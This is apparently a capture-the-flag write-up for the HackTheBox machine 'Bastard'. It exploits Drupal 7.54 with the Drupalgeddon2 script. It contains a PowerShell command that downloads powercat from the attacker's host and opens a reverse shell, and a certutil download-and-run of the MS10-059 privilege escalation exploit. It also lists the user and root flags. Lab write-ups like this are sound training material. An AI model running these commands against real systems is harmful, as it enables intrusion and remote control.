# Bastard

## Recon

Starting with recon:

```sh
sudo autorecon 10.10.10.9
```

## Enumeration

- `Drupal 7.54` on port 80


## Exploit

Drupalgeddon2 the ruby script works from `searchsploit`

```sh
searchsploit -m 44449.rb
```

and when running this, we get a warning about a shebang error, so we use dos2unix to fix this.

```sh
dos2unix 44449.rb
```

and finally fire off the exploit:

```sh
ruby 44449.rb
```

now running this with reverse shell on `443`:

```sh
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.27/powercat.ps1');powercat -c 10.10.14.27 -p 443 -e cmd"
```

gives us a low priv reverse shell.

User.txt: `ba22fde1932d06eb76a163d312f921a2`

## Privilege escalation

Get systeminfo and use `windows-exploit-suggester`

```sh
certutil.exe -urlcache -split -f "http://10.10.14.27/MS10-059.exe" C:\inetpub\drupal-7.54\MS10-059.exe

MS10-059.exe 10.10.14.27 5555
```

root.txt: `4bf12b963da1b30cc93496f617f7ba7c`
